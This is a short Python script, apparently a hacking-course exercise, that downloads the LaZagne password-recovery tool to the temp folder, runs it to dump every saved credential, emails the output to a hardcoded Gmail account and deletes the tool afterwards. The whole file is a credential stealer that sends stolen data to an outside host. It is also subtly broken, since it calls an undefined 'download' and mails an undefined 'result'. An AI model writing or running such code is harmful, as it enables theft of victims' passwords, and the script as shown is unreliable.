#!/usr/bin/env python

#!/usr/bin/env python
#Regex using for string manipulation

import  requests ,subprocess, smtplib, os, tempfile

def Download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb")  as out_file:    #here "r" use for reading and "w" for wriitig and "rw" use for reading and writing
        out_file.write(get_response.content)



def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)  #First_Argument is From and Second_argument is To and third one is content
    server.quit()


temp_directory = tempfile.gettempdir()   #For going to temp directory
os.chdir(temp_directory)
download("DOWNLOADING___URL")
networks = subprocess.check_output("laZagne.exe all", shell=True)
send_mail("hackerdj@gmail.com", "abc123abc", result)
os.remove("laZagne.exe")

